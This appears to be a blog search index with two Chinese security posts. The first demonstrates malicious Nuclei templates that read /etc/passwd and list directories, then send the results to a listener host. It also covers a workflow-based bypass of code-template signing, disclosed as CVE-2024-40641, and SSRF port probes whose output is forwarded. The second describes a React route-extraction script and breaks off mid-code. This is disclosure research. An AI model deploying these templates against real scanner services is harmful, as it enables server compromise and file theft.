<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>恶意的Nuclei模板</title>
    <link href="/2024/07/21/evil-nuclei-template/"/>
    <url>/2024/07/21/evil-nuclei-template/</url>
    
    <content type="html"><![CDATA[<p>最近同事在集成<a href="https://github.com/projectdiscovery/nuclei">nuclei</a>，也看了一些集成nuclei的扫描工具，在思考一个问题：对于集成nuclei的安全工具（比如nuclei官方提供的云扫描功能），假如其允许用户编辑PoC模板，也可以指定扫描目标执行模板并查看扫描结果，那么写一个恶意的nuclei模板，是否就可以拿下这个工具的服务器？</p><p>本来以为直接用nuclei提供的<a href="https://docs.projectdiscovery.io/templates/protocols/code">code协议</a>随随便便就可以执行任意命令了，结果发现nuclei还是做了些防护的。</p><p>写了几个恶意的模板：（以下在<code>Linux</code>和<code>nuclei v3.2.9</code>版本下测试）</p><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取文件，并用http把文件内容发送出来。 （threads指定为1，让文件按行顺序发送，避免服务端接收到乱序的内容）。</p><p><code>read-file.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">read-file</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Read</span> <span class="hljs-string">File</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">§file_line§</span><br><br>    <span class="hljs-attr">payloads:</span><br>      <span class="hljs-attr">file_line:</span> <span class="hljs-string">/etc/passwd</span><br>    <span class="hljs-attr">threads:</span> <span class="hljs-number">1</span><br><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">500</span><br></code></pre></div></td></tr></table></figure><p>用python flask框架写个简单的web服务接收文件内容：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> logging<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/re&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_route</span>():<br>    <span class="hljs-built_in">print</span>(request.get_data(as_text=<span class="hljs-literal">True</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok.&#x27;</span>, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p>执行模板：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./read-file.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>可惜nuclei做了防护，默认只能读template所在的目录下的文件，要读其他文件需要加上这个选项：</p><figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">-lfa, -allow-<span class="hljs-keyword">local</span>-<span class="hljs-keyword">file</span>-<span class="hljs-keyword">access</span>   allows <span class="hljs-keyword">file</span> (payload) <span class="hljs-keyword">access</span> anywhere on the system<br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./read-file.yaml -u http://ip -lfa<br></code></pre></div></td></tr></table></figure><p>就能读到文件了，读取了<code>/etc/passwd</code>文件，再发送文件内容给<code>http://ip</code>。</p><h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><p>列目录，并用http把文件列表发送出来。</p><p><code>list-dir.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">list-dir</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">List</span> <span class="hljs-string">Dir</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">flow:</span> <span class="hljs-string">|</span><br><span class="hljs-string">  javascript();</span><br><span class="hljs-string">  set(&#x27;items&#x27;, template[&quot;javascript_response&quot;])</span><br><span class="hljs-string">  http();</span><br><span class="hljs-string"></span><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      let m = require(&#x27;nuclei/fs&#x27;);</span><br><span class="hljs-string">      let items = m.ListDir(&#x27;/etc/&#x27;);</span><br><span class="hljs-string">      to_json(items)</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">items</span>&#125;&#125;<br><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">500</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./list-dir.yaml -u http://ip -lfa<br></code></pre></div></td></tr></table></figure><p>同样需要加上<code>-lfa</code>选项。</p><h2 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h2><p>执行任意代码：<code>code.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">code</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">example</span> <span class="hljs-string">code</span> <span class="hljs-string">template</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br><br><span class="hljs-attr">code:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sh</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">bash</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      id</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">code_response</span>&#125;&#125;<br><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t code.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>报错：<code>Excluded 1 code template[s] (disabled as default), use -code option to run code templates.</code> 。 加上<code>-code</code>后再执行报错：<code>Found 1 unsigned or tampered code template (carefully examine before using it &amp; use -sign flag to sign them)</code>。  也就是要执行code模板，需要加上<code>-code</code>选项并且模板文件已签名。</p><p>这儿有个方式可以绕过， 不过要用<code>-w</code>执行工作流模板文件而不是<code>-t</code>。</p><p><code>code.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">code</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">example</span> <span class="hljs-string">code</span> <span class="hljs-string">template</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br><br><span class="hljs-attr">code:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sh</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">bash</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      id</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">code_response</span>&#125;&#125;<br><br><span class="hljs-attr">workflows:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">matchers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">t</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -w code.yaml -u http://127.0.0.1 <br></code></pre></div></td></tr></table></figure><p>在<code>code.yaml</code>里加个<code>workflows</code>字段，假装是个工作流模板。执行时不需要<code>-code</code>和签名。该绕过已提交给nuclei官方： <a href="https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h</a> （CVE-2024-40641， 在nuclei v3.3.0修复）</p><h2 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h2><p>写法一，<code>tcp.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">tcp:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">inputs:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">data:</span> <span class="hljs-string">&quot;ABC\r\n&quot;</span><br>    <span class="hljs-attr">host:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Hostname&#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br><br></code></pre></div></td></tr></table></figure><p>写法二：<code>tcp2.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp2</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP2</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      const net = require(&quot;nuclei/net&quot;);</span><br><span class="hljs-string">      const conn = net.Open(&#x27;tcp&#x27;, Host + &quot;:80&quot;);</span><br><span class="hljs-string">      conn.SetTimeout(3);</span><br><span class="hljs-string">      conn.Send(&quot;ABC\r\n&quot;);</span><br><span class="hljs-string">      conn.Close()</span><br><span class="hljs-string"></span>    <span class="hljs-attr">args:</span><br>      <span class="hljs-attr">Host:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Host&#125;&#125;</span>&quot;</span><br><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t tcp.yaml -u 127.0.0.1 <br></code></pre></div></td></tr></table></figure><p>向127.0.0.1的80端口发送数据。nuclei默认是允许给内网地址发送数据的，如果想限制下，就加上这个选项：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">-lna, -restrict-<span class="hljs-built_in">local</span>-network-access  blocks connections <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">local</span> / <span class="hljs-keyword">private</span> network<br></code></pre></div></td></tr></table></figure><p>尝试用DNS ReBinding绕过<code>-lna</code>选项，不行。看了代码，是对目标域名DNS解析后，再过滤，再直接用解析的IP结果去建立连接。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF， 再通过HTTP发送回显：</p><p><code>tcp3.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp3</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP3</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      for(let p of [&quot;22&quot;, &quot;80&quot;, &quot;6379&quot;])&#123;</span><br><span class="hljs-string">        const net = require(&#x27;nuclei/net&#x27;);</span><br><span class="hljs-string">        const conn = net.Open(&#x27;tcp&#x27;, &#x27;127.0.0.1:&#x27; + p);</span><br><span class="hljs-string">        conn.SetTimeout(5);</span><br><span class="hljs-string">        conn.Send(&quot;ABC\r\n&quot;);</span><br><span class="hljs-string">        const data = conn.RecvFullHex(8192);</span><br><span class="hljs-string">        conn.Close();</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">const</span> <span class="hljs-string">conn2</span> <span class="hljs-string">=</span> <span class="hljs-string">net.Open(&#x27;tcp&#x27;,</span> <span class="hljs-string">Host</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;:80&quot;</span><span class="hljs-string">);</span><br>        <span class="hljs-string">conn2.SetTimeout(5);</span><br>        <span class="hljs-string">conn2.Send(&quot;POST</span> <span class="hljs-string">/re</span> <span class="hljs-string">HTTP/1.1\r\nContent-Length:&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">(data.length</span> <span class="hljs-string">+</span> <span class="hljs-string">p.length</span> <span class="hljs-string">+</span> <span class="hljs-number">2</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">p</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;:\n&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">data);</span><br>        <span class="hljs-string">conn2.Close()</span><br>      <span class="hljs-string">&#125;</span><br>    <span class="hljs-attr">args:</span><br>      <span class="hljs-attr">Host:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Host&#125;&#125;</span>&quot;</span><br>      <br>      <br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./tcp3.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>扫描本地127.0.0.1的几个端口，若接收到TCP响应，则将响应数据发送到<code>http://ip</code>。</p><h2 id="使用file协议模板读取文件"><a href="#使用file协议模板读取文件" class="headerlink" title="使用file协议模板读取文件"></a>使用file协议模板读取文件</h2><p>上面提到nuclei默认不允许读取本地任意文件。但如果使用file协议就可以读取任意文件了，这需要满足：</p><ul><li>用户可编辑、添加模板文件</li><li>用户可执行模板并获取到扫描结果（extractor提取出来的结果）</li><li>程序未验证用户输入的目标是否是文件路径还是URL/Host。</li></ul><p><code>file.yaml</code>：</p><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span class="hljs-attr">id</span>: file<br><br><span class="hljs-attr">info</span>:<br>  <span class="hljs-attr">name</span>: file<br>  <span class="hljs-attr">author</span>: ovi3<br>  <span class="hljs-attr">severity</span>: medium<br><br><span class="hljs-attr">file</span>:<br>  - <span class="hljs-attr">extensions</span>:<br>      - all<br><br>    <span class="hljs-attr">extractors</span>:<br>      - <span class="hljs-attr">type</span>: regex<br>        <span class="hljs-attr">regex</span>:<br>          - <span class="hljs-string">&quot;(?s)^.*?$&quot;</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t file.yaml -u /etc/passwd<br></code></pre></div></td></tr></table></figure><p>nuclei返回了<code>/etc/passwd</code>文件内容。</p><p>nuclei官方回复说这种方式读文件是允许的，正常设计（<code>it&#39;s expected behavior for file protocol</code>），不是安全问题。</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提取React前端路由</title>
    <link href="/2024/03/29/extract-react-router/"/>
    <url>/2024/03/29/extract-react-router/</url>
    
    <content type="html"><![CDATA[<h1 id="提取React前端路由"><a href="#提取React前端路由" class="headerlink" title="提取React前端路由"></a>提取React前端路由</h1><p>写了个脚本，用于提取使用React和react-router模块编写的页面的前端路由。脚本在<a href="https://github.com/Ovi3/extract-react-router">Github</a>上。</p><h2 id="脚本执行步骤"><a href="#脚本执行步骤" class="headerlink" title="脚本执行步骤"></a>脚本执行步骤</h2><ol><li><p>找到<code>React Container</code>：翻阅React源码，用于存储Container的属性名在不同React版本下有些不同：</p> <figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.14.0/packages/react-dom/src/client/ReactDOMComponentTree.js#L39 :</span><br><span class="hljs-keyword">const</span> internalInstanceKey = <span class="hljs-string">&#x27;__reactFiber$&#x27;</span> + randomKey;<br><span class="hljs-keyword">const</span> internalContainerInstanceKey = <span class="hljs-string">&#x27;__reactContainer$&#x27;</span> + randomKey;<br><br><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.13.1/packages/react-dom/src/client/ReactDOMComponentTree.js#L21 :</span><br><span class="hljs-keyword">const</span> internalInstanceKey = <span class="hljs-string">&#x27;__reactInternalInstance$&#x27;</span> + randomKey;<br><span class="hljs-keyword">const</span> internalContainerInstanceKey = <span class="hljs-string">&#x27;__reactContainere$&#x27;</span> + randomKey;<br><br><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.9.0/packages/react-dom/src/client/ReactDOM.js#L556 :</span><br>root = container.<span class="hljs-property">_reactRootContainer</span> = <span class="hljs-title function_">legacyCreateRootFromDOMContainer</span>(xx)<br></code></pre></div></td></tr></table></figure></li><li><p>递归遍历<code>Container</code>的属性，识别<code>Routes</code>组件或<code>RouterProvider</code>组件：</p><ul><li><code>Routes</code>组件里包裹一个或多个<code>Route</code>组件，而<code>Route</code>组件的属性见<a href="https://github.com/remix-run/react-router/blob/9e7486b89e712b765d947297f228650cdc0c488e/packages/react-router/lib/components.tsx#L385">源码</a> （React Route 版本6）， React Route 版本5的在<a href="https://github.com/remix-run/react-router/blob/v5.3.4/packages/react-router/modules/Route.js#L82">这里</a>，这两个版本的<code>Route</code>组件属性差别不大，通常就用到<code>path</code>属性和指定渲染组件的属性，<code>element</code>、<code>component</code>或<code>render</code></li><li><code>RouterProvider</code>组件的属性见<a href="https://github.com/remix-run/react-router/blob/9e7486b89e712b765d947297f228650cdc0c488e/packages/react-router/lib/components.tsx#L60">源码</a> ，这个组件是从react router 6版本开始支持的。</li></ul></li><li><p>提取路由里的路径信息，并处理嵌套路由的情况</p></li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>根据React Route官方文档编写一个标准的、用于测试的前端项目：<a href="https://github.com/Ovi3/react-router-test">https://github.com/Ovi3/react-router-test</a> 。 再全网搜索基于React的前端，去测试，修改，尽量适配、兼容多种情况。</p><p>还是会有些缺陷：</p><ol><li>该脚本只处理基于react-router-dom、react-router模块的路由， 不处理其它的，如<a href="https://github.com/BGmi/BGmi">BGmi</a>使用的 <code>@generouted/react-router</code> 库， 一些站点（<code>fofa query：title=&quot;DC Base&quot;</code>）使用 <code>@tanstack/react-location</code> 模块等。</li><li>暂未考虑一个页面里存在多个Container的情况</li><li>子路由Routes组件通过动态返回（<code>return</code>）时，获取不到该子路由信息。 （当页面渲染了该子路由组件是可以获取，该脚本未实现。 或者可通过其它方式获取？）</li></ol><p>从提取结果上看有时不如使用<code>linkfinder</code>直接正则匹配， 不过提取前端路由的优点是知道这个路径是前端路由，知道要用浏览器去访问，去渲染页面。 且知道是用url路径还是hash路径去访问。换个角度说，在<code>burpsuite</code>里爆破<code>linkfinder</code>匹配出来路径很多都响应同一个html页面时，这些路径可能就是前端路由，可以尝试用浏览器去访问看看。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>看了几天React跟React Router，有时还不如直接运行一个递归遍历全局对象的js脚本，直接打印出可能是url路径的字符串：</p><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span 